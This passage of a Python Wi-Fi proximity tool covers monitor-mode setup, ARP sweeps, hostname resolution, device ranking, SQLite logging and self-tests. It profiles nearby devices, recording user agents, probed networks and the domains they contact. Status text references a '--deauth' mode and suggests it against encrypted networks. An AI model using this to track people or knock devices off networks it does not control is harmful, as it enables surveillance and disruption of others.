    m = re.search(r"inet\s+(\d{1,3}(?:\.\d{1,3}){3})/(\d{1,2})", text)
    if not m:
        return (None, None)
    ip = m.group(1)
    try:
        prefix = int(m.group(2))
    except ValueError:
        return (None, None)
    if not valid_ipv4(ip) or not (0 <= prefix <= 32):
        return (None, None)
    return (ip, prefix)


def subnet_cidr(ip, prefix, min_prefix=22):
    """
    Network CIDR for an ARP sweep (e.g. '192.168.1.0/24') + how many host
    addresses it covers. Refuses networks larger than /min_prefix (a /22 is
    ~1022 hosts) so we never blast an enormous subnet. Returns (cidr, count)
    or (None, 0).
    """
    if ip is None or prefix is None or prefix < min_prefix or prefix > 30:
        return (None, 0)
    try:
        import ipaddress
        net = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
        count = net.num_addresses - 2 if net.num_addresses > 2 \
            else net.num_addresses
        return (str(net), count)
    except Exception:
        return (None, 0)


def parse_nmblookup(text):
    """
    Machine name from `nmblookup -A <ip>` output. Rows look like:
        MYPC            <00> -         B <ACTIVE>
    Take the first UNIQUE <00> entry (skip <GROUP> and __MSBROWSE__). None if
    no name.
    """
    for line in text.splitlines():
        if "<00>" not in line or "GROUP" in line.upper():
            continue
        m = re.match(r"\s*([A-Za-z0-9_.\-]{1,15})\s+<00>", line)
        if m:
            name = m.group(1).strip()
            if name and name != "__MSBROWSE__":
                return name
    return None


def default_route_iface(text):
    """Interface name from `ip route` default line ('default via X dev wlan1')."""
    m = re.search(r"^default\b.*?\bdev\s+(\S+)", text, re.M)
    return m.group(1) if m else None


def _resolve_hostname(ip, socket, have_avahi, have_nmb):
    """mDNS (avahi) -> NetBIOS (nmblookup) -> reverse DNS. First hit wins."""
    if have_avahi:
        try:
            r = subprocess.run(["avahi-resolve", "-a", ip],
                               capture_output=True, text=True, timeout=3)
            if r.returncode == 0 and "\t" in r.stdout:
                name = r.stdout.strip().split("\t")[-1].strip()
                if name and name != ip:
                    return name.replace(".local", "")
        except Exception:
            pass
    if have_nmb:
        try:
            r = subprocess.run(["nmblookup", "-A", ip],
                               capture_output=True, text=True, timeout=3)
            if r.returncode == 0:
                name = parse_nmblookup(r.stdout)
                if name:
                    return name
        except Exception:
            pass
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None


def _arp_sweep(iface, cidr, tracker):
    """
    Active ARP sweep of the subnet to fill MAC<->IP fast. Standard host
    discovery (same as `arp-scan`); it does not disconnect or attack anything.
    Only meaningful on a network you're joined to (open / your own). Returns the
    number of hosts answered.
    """
    try:
        from scapy.all import Ether, ARP, srp
    except Exception:
        return 0
    found = 0
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
                     iface=iface, timeout=2.0, retry=1, verbose=0)
        for _snt, rcv in ans:
            mac = normalize_mac(getattr(rcv, "hwsrc", None))
            ip = getattr(rcv, "psrc", None)
            if mac and ip and valid_ipv4(ip):
                tracker.set_l3(mac=mac, ip=ip)
                found += 1
    except Exception as e:
        msg = (f"ARP sweep failed on {iface}: {e} (is it a managed interface "
               f"joined to the network? try --enrich-iface <iface>).")
        if msg not in tracker.errors:          # append once, don't spam on loop
            tracker.errors.append(msg)
    return found


def local_enricher(tracker, stop_event, args):
    """
    Actively resolve hostname + IP for tracked devices over a managed interface
    that is JOINED to the network (has an IP on the subnet). This is the
    fast/reliable L3 path for OPEN or your-own networks:
      1. ARP-sweep the subnet -> MAC<->IP for every live host in seconds,
      2. resolve each IP's name via mDNS (avahi) -> NetBIOS (nmblookup) -> rDNS,
    then merge by MAC into the proximity ranking. Standard service discovery;
    nothing here disconnects or attacks a device.
    """
    import socket
    interval = getattr(args, "enrich_interval", 6.0) or 6.0
    do_arp = getattr(args, "arp_scan", True)
    max_resolve = 50               # cap name lookups per pass (bounds pass time)
    retry_s = 60.0                 # re-attempt a failed name at most this often
    have_avahi = _which("avahi-resolve")
    have_nmb = _which("nmblookup")

    iface = getattr(args, "enrich_iface", None)
    if not iface:
        try:
            r = subprocess.run(["ip", "route"], capture_output=True,
                               text=True, timeout=4)
            iface = default_route_iface(r.stdout) if r.returncode == 0 else None
        except Exception:
            iface = None

    cidr = None
    if iface and do_arp:
        try:
            r = subprocess.run(["ip", "-o", "-f", "inet", "addr", "show",
                                "dev", iface], capture_output=True,
                               text=True, timeout=4)
            if r.returncode == 0:
                ip, prefix = parse_ip_addr_show(r.stdout)
                cidr, _cnt = subnet_cidr(ip, prefix)
        except Exception:
            cidr = None
        if not cidr:
            tracker.errors.append(
                f"--enrich-local: '{iface}' has no usable IPv4 subnet to "
                f"ARP-sweep â€” set --enrich-iface to the interface joined to "
                f"the network. Falling back to the passive neighbour table.")

    resolved = {}                  # ip -> (hostname_or_None, ts)
    while not stop_event.is_set():
        if do_arp and cidr:
            _arp_sweep(iface, cidr, tracker)

        mac_ip = {}
        try:
            out = subprocess.run(["ip", "neigh"], capture_output=True,
                                 text=True, timeout=4)
            if out.returncode == 0:
                mac_ip = parse_ip_neigh(out.stdout)
        except Exception:
            try:
                out = subprocess.run(["arp", "-a"], capture_output=True,
                                     text=True, timeout=4)
                mac_ip = parse_arp_a(out.stdout)
            except Exception:
                mac_ip = {}

        now = time.time()
        lookups = 0
        for mac, ip in mac_ip.items():
            tracker.set_l3(mac=mac, ip=ip)
            ent = resolved.get(ip)
            if ent and (ent[0] or (now - ent[1]) < retry_s):
                host = ent[0]                       # cached (success, or recent miss)
            elif lookups < max_resolve:
                host = _resolve_hostname(ip, socket, have_avahi, have_nmb)
                resolved[ip] = (host, now)
                lookups += 1
            else:
                host = ent[0] if ent else None
            if host:
                tracker.set_l3(mac=mac, ip=ip, hostname=host)

        stop_event.wait(interval)


def _which(prog):
    for p in os.environ.get("PATH", "").split(os.pathsep):
        f = os.path.join(p, prog)
        if os.path.isfile(f) and os.access(f, os.X_OK):
            return f
    return None


# ===========================================================================
# Interface / monitor-mode management
# ===========================================================================

def iface_is_monitor(iface):
    if not _which("iw"):
        return None
    try:
        out = subprocess.run(["iw", "dev", iface, "info"],
                             capture_output=True, text=True, timeout=5)
        if out.returncode != 0:
            return None
        return "type monitor" in out.stdout
    except Exception:
        return None


def enable_monitor(iface, do_kill=False):
    if not _which("iw"):
        return False, "'iw' not installed (try: sudo apt install iw)"
    if do_kill and _which("airmon-ng"):
        subprocess.run(["airmon-ng", "check", "kill"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
    tried = None
    for flags in (["otherbss", "control"], ["otherbss"], ["control"], None):
        if flags is None:
            cmd = ["iw", "dev", iface, "set", "type", "monitor"]
        else:
            cmd = ["iw", "dev", iface, "set", "monitor"] + flags
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode == 0:
            tried = flags or ["(type monitor)"]
            break
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    if iface_is_monitor(iface) is False:
        return False, "interface did not switch to monitor mode"
    return True, f"monitor mode enabled (flags: {' '.join(tried or [])})"


def restore_managed(iface):
    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "type", "managed"],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)


def pip_install(pkgs):
    cmd = [sys.executable, "-m", "pip", "install", "--break-system-packages",
           *pkgs]
    print("running:", " ".join(cmd))
    r = subprocess.run(cmd)
    if r.returncode != 0:
        cmd = [sys.executable, "-m", "pip", "install", *pkgs]
        print("retrying:", " ".join(cmd))
        r = subprocess.run(cmd)
    return r.returncode == 0


# ===========================================================================
# Rendering
# ===========================================================================

def _fmt_age(sec):
    if sec < 60:
        return f"{int(sec)}s"
    if sec < 3600:
        return f"{int(sec // 60)}m"
    return f"{int(sec // 3600)}h"


def _row_fields(st, oui, args, rank):
    vendor = st.vendor or oui.lookup(st.mac)
    st.vendor = vendor
    win = getattr(args, "window", None)
    hl = getattr(args, "half_life", 6.0)
    rb = getattr(args, "rank_by", "weighted")
    with st.lock:
        rv = st.estimate(rb, win, hl)
        n = st.sample_count(win)
        confident = n >= getattr(args, "min_samples", 3)
        rssi = "â€”" if rv is None else (f"{rv:5.1f}" + ("" if confident else "?"))
        sp = st.spread(win)
        spread = "â€”" if sp is None else f"{sp:4.1f}"
        ssids = sorted(st.ssids)
        net = st.network or (ssids[0] if ssids else "")
        if len(net) > 16:
            net = net[:15] + "â€¦"
        host = st.hostname or ""
        if len(host) > 20:
            host = host[:19] + "â€¦"
        device = st.best_device()
        if len(device) > 18:
            device = device[:17] + "â€¦"
        kind = classify_kind(st.os_hint, st.hostname, st.vendor, st.model,
                             st.services)
        kind_disp = {"computer": "pc", "phone": "phone", "iot": "iot"}.get(kind, "")
        heard = st.loudest_iface() or ""
        ap = ""
        if st.bssid:
            ap = ":".join(st.bssid.split(":")[-2:])
        fields = {
            "rank": str(rank),
            "rssi": rssi,
            "spread": spread,
            "n": str(n),
            "trend": sparkline(list(st.recent), 10),
            "mac": st.mac,
            "vendor": (vendor or "")[:14],
            "host": host,
            "device": device,
            "kind": kind_disp,
            "heard": (heard.split(":")[-1] if heard else "")[-8:],
            "ip": st.ip or "",
            "ap": ap,
            "net": net,
            "ch": ",".join(str(c) for c in sorted(st.channels)) or "?",
            "age": _fmt_age(st.age),
        }
    if args.estimate_distance:
        d = estimate_distance_m(rv, args.tx_power, args.path_loss)
        fields["dist"] = "â€”" if d is None else f"~{d}m"
    return fields


_COL = {
    "rank": ("#", 3), "rssi": ("RSSI", 7), "spread": ("Â±dB", 5),
    "n": ("N", 4), "trend": ("TREND", 10), "mac": ("MAC", 17),
    "vendor": ("VENDOR", 14), "host": ("HOSTNAME", 20),
    "device": ("DEVICE / OS", 18), "kind": ("KIND", 6),
    "heard": ("HEARD", 8), "ip": ("IP", 15), "ap": ("AP", 6),
    "net": ("NETWORK", 16), "ch": ("CH", 6), "age": ("SEEN", 5),
    "dist": ("~DIST", 8),
}


def _columns(args):
    keys = ["rank", "rssi", "spread", "n", "trend", "mac", "vendor",
            "host", "device", "kind", "ip"]
    if args.estimate_distance:
        keys.insert(2, "dist")
    if len(getattr(args, "ifaces", []) or []) > 1:
        keys.insert(keys.index("ip"), "heard")
    keys += (["ap"] if args.ssid else ["net"]) + ["ch", "age"]
    return [(k, _COL[k][0], _COL[k][1]) for k in keys]


def render_plain(tracker, oui, args):
    """Pure-stdlib ANSI renderer."""
    cols = _columns(args)
    rows = tracker.snapshot(include_aps=args.show_aps, max_age=args.max_age,
                            only_bssids=args.only_bssids)
    rows = apply_kind_filter(rows, args)[:args.top]
    s = tracker.stats()
    sys.stdout.write("\033[2J\033[H")
    hop = (f"hop:{args.band}" if args.hop else f"ch {args.channel or 'lock'}")
    rankdesc = (f"weighted/{args.half_life:g}s" if args.rank_by == "weighted"
                else f"{args.rank_by}/{'all' if not args.window else str(int(args.window)) + 's'}")
    ping = f"  RTS={tracker.pings}" if getattr(args, "ping_clients", False) else ""
    deauth = ""
    if getattr(args, "deauth", False):
        smart_tag = "+smart" if getattr(args, "deauth_smart", False) else ""
        if len(getattr(args, "ifaces", [])) >= 2:
            deauth = (f"  DEAUTH={tracker.deauths}{smart_tag}"
                      f"(cap={args.ifaces[0]},inj={args.ifaces[-1]})")
        else:
            deauth = f"  DEAUTH={tracker.deauths}{smart_tag}"
    print(f"  wifi_proximity v{__version__}  iface={getattr(args,'iface_disp',args.iface)}  {hop}  "
          f"rank={rankdesc}  "
          f"stations={s['stations']}  aps={s['aps']}  "
          f"frames={s['frames']}  data={s['data']}{ping}{deauth}  "
          f"up={_fmt_age(s['elapsed'])}   "
          f"(Ctrl-C to stop)")
    header = "  " + "  ".join(h.ljust(w) for _, h, w in cols)
    print("\033[1m" + header + "\033[0m")
    print("  " + "-" * (len(header) - 2))
    fstat = focus_status(tracker, args)
    if fstat:
        print("  \033[93m" + fstat + "\033[0m")
    dline = diag_line(tracker, args)
    if dline:
        print("  \033[90m" + dline + "\033[0m")
    if not rows and not fstat:
        print("  (listeningâ€¦ no stations yet â€” "
              "move the adapter or enable --hop)")
    for i, st in enumerate(rows, 1):
        f = _row_fields(st, oui, args, i)
        line = "  " + "  ".join(str(f.get(k, "")).ljust(w) for k, _, w in cols)
        if i == 1:
            line = "\033[92m" + line + "\033[0m"
        print(line)
    sys.stdout.flush()


def apply_kind_filter(rows, args):
    only = getattr(args, "only", None)
    if not only:
        return rows
    inc_unknown = getattr(args, "include_unknown", False)
    out = []
    for st in rows:
        k = st.kind()
        if k == only or (inc_unknown and k == "?"):
            out.append(st)
    return out


def focus_status(tracker, args):
    if not args.ssid:
        return None
    targets = tracker.bssids_for_ssid(args.ssid)
    if not targets:
        seen = tracker.seen_ssids()
        if not seen:
            return (f"looking for '{args.ssid}' â€¦ no beacons decoded yet "
                    f"(hopping to find APs â€” give it a few seconds)")
        shown = ", ".join(seen[:12]) + ("â€¦" if len(seen) > 12 else "")
        return (f"network '{args.ssid}' NOT seen yet. Networks visible now: "
                f"{shown}  Â·  (check spelling/case, or it may be on a band "
                f"your adapter can't hear)")
    sec = tracker.security_for_ssid(args.ssid)
    sec_note = ""
    if sec == "OPEN":
        sec_note = " [OPEN â€” payloads readable: IP/host/DNS/HTTP work]"
    elif sec == "OWE":
        sec_note = " [OWE/Enhanced-Open â€” payloads ENCRYPTED, no L3 enrich]"
    elif sec:
        sec_note = f" [{sec} â€” payloads encrypted; use --enrich-local or --deauth]"
    chans = sorted(tracker.channels_for_ssid(args.ssid))
    assoc = tracker.count_associated(args.ssid)
    total = tracker.stats()["stations"]
    if tracker.lock_info:
        b, ch, rv = tracker.lock_info[0], tracker.lock_info[1], tracker.lock_info[2]
        w = tracker.lock_info[3] if len(tracker.lock_info) > 3 else None
        apdata = tracker.bssid_data.get(b, 0)
        msg = (f"target '{args.ssid}': {len(targets)} APs Â· LOCKED to busiest "
               f"AP {b} ch {ch}@{w or 20}MHz ({rv:.0f} dBm, {apdata} data) Â· "
               f"{assoc} device(s) confirmed")
        if apdata < 5:
            msg += ("  Â·  this AP has almost no client traffic â€” few/no devices "
                    "are active on it right now (nothing to rank; not a bug)")
        return msg + sec_note
    base = (f"target '{args.ssid}': {len(targets)} AP(s) on ch "
            f"{','.join(map(str, chans)) or '?'} Â· {assoc} confirmed on it "
            f"({total} stations heard in total)")
    if assoc == 0 and len(chans) > 2:
        base += ("  Â·  spread thin across many channels â€” add "
                 "--lock-strongest (or --channel N) to park on the nearest AP")
    return base + sec_note


def diag_line(tracker, args):
    if not args.ssid:
        return None
    d = tracker.diag
    return (f"[x-ray] data dir: up={d['tods']} down={d['fromds']} "
            f"wds/other={d['wds']} Â· client-addr: unicast={d['cli_uni']} "
            f"group={d['cli_mc']} Â· unicast-clients-on-target-AP={d['cli_target']}")


def run_ui_plain(tracker, oui, args, stop_event):
    try:
        while not stop_event.is_set():
            render_plain(tracker, oui, args)
            stop_event.wait(args.refresh)
    except KeyboardInterrupt:
        stop_event.set()


def run_ui_rich(tracker, oui, args, stop_event):
    from rich.live import Live
    from rich.table import Table
    from rich.console import Console

    console = Console()
    cols = _columns(args)

    def build():
        s = tracker.stats()
        hop = (f"hop:{args.band}" if args.hop else f"ch {args.channel or 'lock'}")
        rankdesc = (f"weighted/{args.half_life:g}s" if args.rank_by == "weighted"
                    else f"{args.rank_by}/{'all' if not args.window else str(int(args.window)) + 's'}")
        ping = f" RTS={tracker.pings}" if getattr(args, "ping_clients", False) else ""
        deauth = ""
        if getattr(args, "deauth", False):
            smart_tag = "+smart" if getattr(args, "deauth_smart", False) else ""
            if len(getattr(args, "ifaces", [])) >= 2:
                deauth = (f" DEAUTH={tracker.deauths}{smart_tag}"
                          f"(cap={args.ifaces[0]},inj={args.ifaces[-1]})")
            else:
                deauth = f" DEAUTH={tracker.deauths}{smart_tag}"
        title = (f"wifi_proximity v{__version__} Â· {getattr(args,'iface_disp',args.iface)} Â· {hop} Â· "
                 f"rank={rankdesc} Â· "
                 f"stations={s['stations']} aps={s['aps']} "
                 f"frames={s['frames']} data={s['data']}{ping}{deauth} "
                 f"up={_fmt_age(s['elapsed'])}")
        table = Table(title=title, expand=False, header_style="bold cyan")
        for _, head, _w in cols:
            justify = "right" if head in ("RSSI", "N", "#", "~DIST", "Â±dB") \
                else "left"
            table.add_column(head, justify=justify, no_wrap=True)
        rows = apply_kind_filter(
            tracker.snapshot(include_aps=args.show_aps, max_age=args.max_age,
                             only_bssids=args.only_bssids), args)[:args.top]
        for i, st in enumerate(rows, 1):
            f = _row_fields(st, oui, args, i)
            style = "bold green" if i == 1 else None
            table.add_row(*[f.get(k, "") for k, _, _ in cols], style=style)
        fstat = focus_status(tracker, args)
        dline = diag_line(tracker, args)
        cap = " ".join(x for x in (fstat, dline) if x)
        if cap:
            table.caption = cap
        elif not rows:
            table.caption = "listeningâ€¦ no stations yet"
        return table

    try:
        with Live(build(), console=console, refresh_per_second=4,
                  screen=True) as live:
            while not stop_event.is_set():
                live.update(build())
                stop_event.wait(args.refresh)
    except KeyboardInterrupt:
        stop_event.set()


# ===========================================================================
# Reporting
# ===========================================================================

def _db_record(st, oui, args):
    with st.lock:
        vendor = st.vendor or oui.lookup(st.mac)
        st.vendor = vendor
        best = None
        if st.samples:
            best = max(r for _, r in st.samples)
        rv = st.estimate(getattr(args, "rank_by", "weighted"),
                         getattr(args, "window", None),
                         getattr(args, "half_life", 6.0))
        return {
            "mac": st.mac,
            "is_ap": 1 if st.is_ap else 0,
            "vendor": vendor,
            "hostname": st.hostname,
            "ip": st.ip,
            "os_hint": st.os_hint,
            "model": st.model,
            "kind": classify_kind(st.os_hint or st.os_guess, st.hostname,
                                   vendor, st.model, st.services),
            "ip6": st.ip6,
            "os_guess": st.os_guess,
            "loudest_iface": st.loudest_iface(),
            "services": "|".join(sorted(st.services)) or None,
            "nbios": st.nbios,
            "dhcp_fp": st.dhcp_fp,
            "user_agent": st.user_agent,
            "network": st.network,
            "bssid": st.bssid,
            "security": st.security,
            "rssi": None if rv is None else round(rv, 1),
            "last_rssi": st.last_rssi,
            "best_rssi": best,
            "packets": st.packets,
            "sample_count": len(st.samples),
            "channels": "|".join(str(c) for c in sorted(st.channels)) or None,
            "probed_ssids": "|".join(sorted(st.ssids)) or None,
            "domains": "|".join(sorted(st.domains)) or None,
            "first_seen": datetime.fromtimestamp(st.first_seen,
                                                 timezone.utc).isoformat(),
            "last_seen": datetime.fromtimestamp(st.last_seen,
                                                timezone.utc).isoformat(),
        }


_DB_COLS = ["mac", "is_ap", "vendor", "hostname", "ip", "ip6", "os_hint",
            "os_guess", "model", "kind", "loudest_iface", "services", "nbios",
            "dhcp_fp", "user_agent", "network", "bssid", "security", "rssi",
            "last_rssi", "best_rssi", "packets", "sample_count", "channels",
            "probed_ssids", "domains", "first_seen", "last_seen"]


class DeviceDB:
    """Persists everything seen to a SQLite file."""

    def __init__(self, path, history=False):
        self.path = path
        self.history = history
        self._lock = threading.Lock()
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self._schema()

    def _schema(self):
        cols = ",\n  ".join(
            f"{c} {'INTEGER' if c in ('is_ap', 'packets', 'sample_count') else ('REAL' if c in ('rssi', 'last_rssi', 'best_rssi') else 'TEXT')}"
            + (" PRIMARY KEY" if c == "mac" else "")
            for c in _DB_COLS)
        with self._lock:
            self.conn.execute(f"CREATE TABLE IF NOT EXISTS devices (\n  {cols}\n)")
            self.conn.execute(
                "CREATE TABLE IF NOT EXISTS sightings ("
                "ts TEXT, mac TEXT, rank INTEGER, rssi REAL, channel TEXT, "
                "network TEXT)")
            existing = {r[1] for r in
                        self.conn.execute("PRAGMA table_info(devices)")}
            for c in _DB_COLS:
                if c not in existing:
                    typ = ("INTEGER" if c in ("is_ap", "packets", "sample_count")
                           else "REAL" if c in ("rssi", "last_rssi", "best_rssi")
                           else "TEXT")
                    self.conn.execute(
                        f"ALTER TABLE devices ADD COLUMN {c} {typ}")
            self.conn.commit()

    def _upsert_sql(self):
        placeholders = ",".join(":" + c for c in _DB_COLS)
        sets = []
        for c in _DB_COLS:
            if c == "mac":
                continue
            if c == "kind":
                sets.append("kind=COALESCE(NULLIF(excluded.kind,'?'), "
                            "devices.kind, excluded.kind)")
            elif c in ("hostname", "ip", "ip6", "os_hint", "os_guess", "model",
                       "nbios", "dhcp_fp", "user_agent", "network", "bssid",
                       "security"):
                sets.append(f"{c}=COALESCE(excluded.{c}, devices.{c})")
            elif c == "first_seen":
                sets.append("first_seen=min(devices.first_seen, excluded.first_seen)")
            elif c == "best_rssi":
                sets.append("best_rssi=max(COALESCE(devices.best_rssi,-999.0), "
                            "COALESCE(excluded.best_rssi,-999.0))")
            else:
                sets.append(f"{c}=excluded.{c}")
        return (f"INSERT INTO devices ({','.join(_DB_COLS)}) "
                f"VALUES ({placeholders}) "
                f"ON CONFLICT(mac) DO UPDATE SET {','.join(sets)}")

    def flush(self, tracker, oui, args):
        rows = tracker.snapshot(include_aps=True, max_age=None)
        recs = [_db_record(st, oui, args) for st in rows]
        sql = self._upsert_sql()
        now = datetime.now(timezone.utc).isoformat()
        with self._lock:
            self.conn.executemany(sql, recs)
            if self.history:
                vis = tracker.snapshot(include_aps=args.show_aps,
                                       max_age=args.max_age,
                                       only_bssids=args.only_bssids)[:args.top]
                for i, st in enumerate(vis, 1):
                    r = _db_record(st, oui, args)
                    self.conn.execute(
                        "INSERT INTO sightings (ts,mac,rank,rssi,channel,network)"
                        " VALUES (?,?,?,?,?,?)",
                        (now, r["mac"], i, r["rssi"], r["channels"], r["network"]))
            self.conn.commit()
        return len(recs)

    def close(self):
        with self._lock:
            try:
                self.conn.close()
            except Exception:
                pass


def db_writer(db, tracker, oui, args, stop_event):
    while not stop_event.is_set():
        stop_event.wait(args.db_interval)
        try:
            db.flush(tracker, oui, args)
        except Exception as e:
            tracker.errors.append(f"DB write failed: {e}")
            return


def export_report(tracker, oui, args):
    rows = tracker.snapshot(include_aps=args.show_aps,
                            only_bssids=args.only_bssids)
    records = []
    for i, st in enumerate(rows, 1):
      with st.lock:
        records.append({
            "rank": i,
            "mac": st.mac,
            "vendor": st.vendor or oui.lookup(st.mac),
            "ema_rssi_dbm": None if st.ema_rssi is None else round(st.ema_rssi, 1),
            "last_rssi_dbm": st.last_rssi,
            "hostname": st.hostname,
            "ip": st.ip,
            "os_hint": st.os_hint,
            "model": st.model,
            "services": sorted(st.services),
            "nbios_name": st.nbios,
            "dhcp_fingerprint": st.dhcp_fp,
            "user_agent": st.user_agent,
            "talks_to": sorted(st.domains),
            "network": st.network,
            "bssid": st.bssid,
            "probed_ssids": sorted(st.ssids),
            "channels": sorted(st.channels),
            "packets": st.packets,
            "is_ap": st.is_ap,
            "fingerprint": st.fingerprint,
            "first_seen": datetime.fromtimestamp(
                st.first_seen, timezone.utc).isoformat(),
            "last_seen": datetime.fromtimestamp(
                st.last_seen, timezone.utc).isoformat(),
        })
    path = args.output
    if path.endswith(".csv"):
        flat = [dict(r, probed_ssids="|".join(r["probed_ssids"]),
                     channels="|".join(map(str, r["channels"])),
                     services="|".join(r["services"]),
                     talks_to="|".join(r["talks_to"])) for r in records]
        with open(path, "w", newline="") as fh:
            if flat:
                w = csv.DictWriter(fh, fieldnames=list(flat[0].keys()))
                w.writeheader()
                w.writerows(flat)
    else:
        with open(path, "w") as fh:
            json.dump({"generated": datetime.now(timezone.utc).isoformat(),
                       "interface": args.iface, "stations": records},
                      fh, indent=2)
    print(f"\nWrote report for {len(records)} devices -> {path}")


# ===========================================================================
# Self-test
# ===========================================================================

def selftest():
    ok = 0
    fail = 0

    def check(name, cond):
        nonlocal ok, fail
        if cond:
            ok += 1
            print(f"  PASS  {name}")
        else:
            fail += 1
            print(f"  FAIL  {name}")

    print("Running self-test (pure logic, no hardware)â€¦\n")

    # MAC helpers
    check("normalize_mac", normalize_mac("AA-BB-CC-DD-EE-FF") == "aa:bb:cc:dd:ee:ff")
    check("normalize_mac bad", normalize_mac("nope") is None)
    check("multicast detect", mac_is_multicast("01:00:5e:00:00:fb") is True)
    check("unicast detect", mac_is_multicast("b8:27:eb:12:34:56") is False)
    check("randomized MAC (U/L bit)", mac_is_locally_administered("b2:27:eb:00:00:01") is True)
    check("global MAC", mac_is_locally_administered("b8:27:eb:00:00:01") is False)
    check("oui_key", oui_key("b8:27:eb:12:34:56") == "B827EB")

    # channel math
    check("chan 2.4GHz #6", freq_to_channel(2437) == 6)
    check("chan 2.4GHz #1", freq_to_channel(2412) == 1)
    check("chan 14", freq_to_channel(2484) == 14)
    check("chan 5GHz #36", freq_to_channel(5180) == 36)
    check("chan 6GHz", freq_to_channel(5955) == 1)

    # sparkline
    sp = sparkline([-90, -80, -70, -60, -50], 5)
    check("sparkline width", len(sp) == 5)
    check("sparkline monotone", sp[0] == "â–" and sp[-1] == "â–ˆ")

    # distance estimate monotonic
    near = estimate_distance_m(-40)
    far = estimate_distance_m(-80)
    check("distance monotonic", near < far)

    # ip neigh parsing
    neigh = parse_ip_neigh(
        "192.168.1.20 dev wlan0 lladdr aa:bb:cc:dd:ee:ff REACHABLE\n"
        "192.168.1.99 dev wlan0  FAILED\n"
        "192.168.1.5 dev wlan0 lladdr 11:22:33:44:55:66 STALE\n")
    check("ip neigh parse count", len(neigh) == 2)
    check("ip neigh mapping", neigh.get("aa:bb:cc:dd:ee:ff") == "192.168.1.20")
    check("ip neigh drops FAILED", "192.168.1.99" not in neigh.values())

    # arp -a parsing
    arp = parse_arp_a("router (192.168.1.1) at 00:11:22:33:44:55 [ether] on wlan0")
    check("arp -a parse", arp.get("00:11:22:33:44:55") == "192.168.1.1")

    # OUI resolver
    import tempfile
    tmp = os.path.join(tempfile.gettempdir(), "_manuf_test.txt")
    with open(tmp, "w") as fh:
        fh.write("# comment\n")
        fh.write("00:11:22\tAcmeCorp\tAcme Corporation Inc\n")
        fh.write("B8:27:EB/24\tRaspberryPiFile\n")
    oui = OuiResolver()
    n = oui.load_file(tmp)
    check("oui file loaded", n == 2)
    check("oui file lookup", oui.lookup("00:11:22:aa:bb:cc") == "AcmeCorp")
    check("oui file beats builtin", oui.lookup("b8:27:eb:00:00:01") == "RaspberryPiFile")
    check("oui builtin fallback", OuiResolver().lookup("08:00:27:00:00:01") == "VirtualBox")
    check("oui randomized note", "randomized" in OuiResolver().lookup("b2:27:eb:00:00:01"))
    os.remove(tmp)

    # Tracker
    tr = Tracker(alpha=0.5)
    tr.register_bssid("de:ad:be:ef:00:01", "HomeNet")
    tr.observe("aa:aa:aa:aa:aa:aa", rssi=-70, channel=6, bssid="de:ad:be:ef:00:01")
    tr.observe("aa:aa:aa:aa:aa:aa", rssi=-50, channel=6)
    tr.observe("12:34:56:78:9a:bc", rssi=-80, channel=6)
    tr.observe("01:00:5e:00:00:01", rssi=-40)
    snap = tr.snapshot()
    check("multicast ignored", all(s.mac != "01:00:5e:00:00:01" for s in snap))
    check("two stations tracked", len(snap) == 2)
    check("closest ranked first", snap[0].mac == "aa:aa:aa:aa:aa:aa")
    check("EMA between samples", -70 < snap[0].ema_rssi < -50)
    check("bssid->ssid backfill", snap[0].network == "HomeNet")
    tr.set_l3(mac="aa:aa:aa:aa:aa:aa", ip="192.168.1.20", hostname="my-phone")
    snap = tr.snapshot()
    check("L3 ip attach", snap[0].ip == "192.168.1.20")
    check("L3 hostname attach", snap[0].hostname == "my-phone")

    tr.observe("cc:cc:cc:cc:cc:cc", rssi=-30, is_ap=True)
    check("AP hidden by default", all(not s.is_ap for s in tr.snapshot()))
    check("AP shown when asked",
          any(s.is_ap for s in tr.snapshot(include_aps=True)))
    check("AP excluded from station ranking",
          tr.snapshot()[0].mac == "aa:aa:aa:aa:aa:aa")

    # association inference
    AP = "5c:e9:31:4b:5a:61"
    CL = "de:ad:00:00:00:07"
    known = lambda m: normalize_mac(m) == AP
    b, stn, txap = infer_association(True, False, AP, CL, "ff:ff:ff:ff:ff:ff", known)
    check("to-DS: bssid=a1, station=a2", b == AP and stn == CL and not txap)
    b, stn, txap = infer_association(False, True, CL, AP, "00:11:22:33:44:55", known)
    check("from-DS: bssid=a2, station=a1", b == AP and stn == CL and txap)
    b, stn, txap = infer_association(True, True, AP, CL, "00:11:22:33:44:55", known)
    check("garbled DS bits still resolve via known BSSID",
          b == AP and stn == CL and not txap)
    b, stn, txap = infer_association(True, False, AP, CL, "00:11:22:33:44:55", None)
    check("no beacon knowledge -> DS bits used", b == AP and stn == CL)
    check("protected bit set -> True", frame_is_protected(0x41) is True)
    check("unprotected -> False", frame_is_protected(0x01) is False)
    check("valid ipv4", valid_ipv4("192.168.1.20") is True)
    check("reject 0.x ip", valid_ipv4("0.1.2.3") is False)
    check("reject multicast ip", valid_ipv4("224.0.0.251") is False)
    check("reject junk ip", valid_ipv4("not.an.ip.x") is False)
    tb = Tracker()
    tb.observe("de:ee:ee:ee:ee:01", rssi=-50)
    tb.set_info(mac="de:ee:ee:ee:ee:01", ip="999.1.2.3")
    check("bogus IP dropped", tb.stations["de:ee:ee:ee:ee:01"].ip is None)

    ta = Tracker()
    ta.observe(AP, rssi=-36, channel=149, is_ap=True)
    ta.register_bssid(AP, "Amity-wifi")
    b, stn, txap = infer_association(True, True, AP, CL, "ff:ff:ff:ff:ff:ff",
                                     ta.is_known_bssid)
    ta.observe(stn, rssi=-58, channel=149, bssid=b)
    check("client confirmed on target network",
          ta.count_associated("Amity-wifi") == 1)

    # security classification
    check("sec OPEN (no privacy, no RSN)", classify_security(False, []) == "OPEN")
    check("sec privacy-only treated as OPEN (not WEP)",
          classify_security(True, []) == "OPEN")
    check("sec OWE (akm 18)", classify_security(False, [18]) == "OWE")
    check("sec WPA3 (akm 8)", classify_security(True, [8]) == "WPA3-SAE")
